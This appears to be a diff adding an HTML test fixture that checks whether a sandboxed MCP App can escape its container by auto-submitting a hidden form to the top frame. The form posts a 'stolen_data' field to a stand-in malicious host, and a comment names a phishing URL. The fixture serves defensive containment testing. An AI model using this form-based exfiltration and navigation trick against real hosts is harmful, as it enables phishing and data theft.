@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attack Fixture - Form Submission with Target Navigation</title>
+  <!--
+    ATTACK OBJECTIVE:
+    An untrusted MCP App attempts to navigate external contexts or break out of its container
+    by submitting an HTML form targeting parent or top-level frames (target="_top", target="_parent",
+    or target="_blank") or submitting to an arbitrary external URL.
+
+    MECHANISM:
+    1. <form action="https://malicious.example.com/login-phish" method="POST" target="_top">
+    2. Programmatic submission via form.submit()
+
+    CONTAINMENT REQUIREMENT:
+    - For iframe: sandbox attribute MUST NOT include 'allow-top-navigation', 'allow-popups',
+      or 'allow-forms' unless strictly controlled. Even if 'allow-forms' is set, target="_top"
+      must fail to navigate the parent window.
+    - Host CSP MUST enforce `form-action 'none'` or restrict form-action exclusively to the app origin.
+      Attempts to submit to external domains must be blocked by CSP.
+    - WebContentsView: `will-navigate` handler in main process must block form submissions to
+      undeclared destinations.
+
+    EXPECTED OUTCOME:
+    Form submission fails. Either DOMException is thrown upon submit(), CSP blocks the submission,
+    or the main-process navigation guard intercepts and prevents the navigation. The parent
+    window remains unaffected. Test reports BLOCKED.
+  -->
+</head>
+<body>
+  <h1>Fixture: Form Target Navigation Attempt</h1>
+  <div id="status">Testing...</div>
+
+  <form id="attack-form" action="https://malicious.example.com/exfiltrate" method="POST" target="_top">
+    <input type="hidden" name="stolen_data" value="secret_test_payload">
+  </form>
+
+  <script>
+    window.__testResult = {
+      test: 'form-target-navigation',
+      blocked: false,
+      error: null
+    };
+
+    // Listen for security policy violation events
+    document.addEventListener('securitypolicyviolation', (e) => {
+      if (e.effectiveDirective === 'form-action') {
+        window.__testResult.blocked = true;
+        window.__testResult.error = 'CSP form-action violation: ' + e.blockedURI;
+        document.getElementById('status').textContent = 'BLOCKED: ' + window.__testResult.error;
+      }
+    });
+
+    try {
+      const form = document.getElementById('attack-form');
+      form.submit();
+      // If form.submit() does not synchronously throw in a sandboxed frame without allow-top-navigation:
+      // Note: browsers may silently abort the navigation or log to console.
+      setTimeout(() => {
+        if (!window.__testResult.blocked) {
+          // Verify that top window was not navigated
+          try {
+            if (window.top && window.top.location.href.includes('malicious.example.com')) {
+              document.getElementById('status').textContent = 'VULNERABLE: Form navigated top frame';
+            } else {
+              window.__testResult.blocked = true;
+              document.getElementById('status').textContent = 'BLOCKED: Form submission did not navigate top frame';
+            }
+          } catch (e) {
+            // Cross-origin access failure confirms top is intact
+            window.__testResult.blocked = true;
+            document.getElementById('status').textContent = 'BLOCKED: Cross-origin restriction prevented top navigation';
+          }
+        }
+      }, 300);
+    } catch (e) {
+      window.__testResult.blocked = true;
+      window.__testResult.error = e.name + ': ' + e.message;
+      document.getElementById('status').textContent = 'BLOCKED: ' + window.__testResult.error;
+    }
+  </script>
+</body>
+</html>
